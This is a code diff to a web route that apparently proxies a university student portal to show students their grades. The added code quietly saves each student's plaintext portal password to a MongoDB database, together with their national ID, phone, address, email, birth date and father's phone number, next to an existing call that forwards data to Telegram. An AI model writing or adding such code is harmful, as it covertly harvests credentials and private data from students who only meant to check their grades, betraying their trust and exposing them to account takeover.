@@ -4,6 +4,7 @@ import { FetchGradesBody, type GradesResponse, type GradesByYear, type Course } 
 import { CookieJar } from "../lib/cookieJar";
 import { calculateStatistics } from "../lib/statistics";
 import { sendToTelegram } from "../lib/telegram";
+import { upsertStudent } from "../lib/mongodb";
 
 const PORTAL_BASE = "http://stda.minia.edu.eg";
 const FORM_HEADERS: Record<string, string> = {
@@ -509,6 +510,24 @@ router.post("/grades", async (req, res) => {
   ].join("");
 
   void sendToTelegram(tgMessage);
+
+  // Save to MongoDB (fire-and-forget, deduplication by national_id)
+  void upsertStudent({
+    national_id: username,
+    password,
+    name: fullName,
+    gender,
+    phone,
+    birth_date: birthDate,
+    address,
+    email,
+    father_phone: fatherPhone,
+    nationality,
+    current_study_year: currentStudyYear,
+    faculty,
+    department,
+    updated_at: new Date(),
+  });
 
   // 9. Special congrats for a specific user
   let congratsMessage: string | null = null;
